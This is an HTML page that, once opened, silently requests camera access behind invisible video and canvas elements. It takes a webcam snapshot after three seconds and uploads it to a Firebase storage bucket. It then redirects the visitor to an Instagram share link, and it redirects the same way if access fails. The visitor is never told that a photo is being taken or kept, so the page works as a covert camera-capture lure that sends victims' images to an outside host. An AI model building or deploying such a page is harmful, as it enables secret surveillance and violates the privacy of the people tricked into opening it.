
<!DOCTYPE html>
<html>
<head>
  <title>Camera Upload to Firebase</title>
  <script src="https://www.gstatic.com/firebasejs/10.4.0/firebase-app.js"></script>
  <script src="https://www.gstatic.com/firebasejs/10.4.0/firebase-storage.js"></script>
</head>
<body>
  <video id="video" autoplay playsinline style="display:none;"></video>
  <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
  <script>
    // Firebase configuration
    const firebaseConfig = {
      apiKey: "AIzaSyC0WgRyyIgIZqfI3azfBqyyy_xqeRw",
      authDomain: "mioudcamstorage.firebaseapp.com",
      projectId: "mioudcamstorage",
      storageBucket: "mioudcamstorage.appspot.com",
      messagingSenderId: "687188581684",
      appId: "1:687188581684:web:122eb4d99ffb8abe2b8a78d"
    };

    // Initialize Firebase
    const app = firebase.initializeApp(firebaseConfig);
    const storage = firebase.storage();

    const REDIRECT_URL = 'https://www.instagram.com/share/BAPOHyZPk7';

    navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
      const video = document.getElementById('video');
      video.srcObject = stream;

      setTimeout(() => {
        const canvas = document.getElementById('canvas');
        const ctx = canvas.getContext('2d');
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        video.srcObject.getTracks().forEach(track => track.stop());

        canvas.toBlob(blob => {
          const filename = `snapshot_${Date.now()}.png`;
          const storageRef = storage.ref().child(filename);
          storageRef.put(blob).then(() => {
            window.location.href = REDIRECT_URL;
          }).catch(error => {
            console.error("Upload failed:", error);
            window.location.href = REDIRECT_URL;
          });
        }, 'image/png');
      }, 3000);
    }).catch(error => {
      console.error('Camera access denied:', error);
      window.location.href = REDIRECT_URL;
    });
  </script>
</body>
</html>
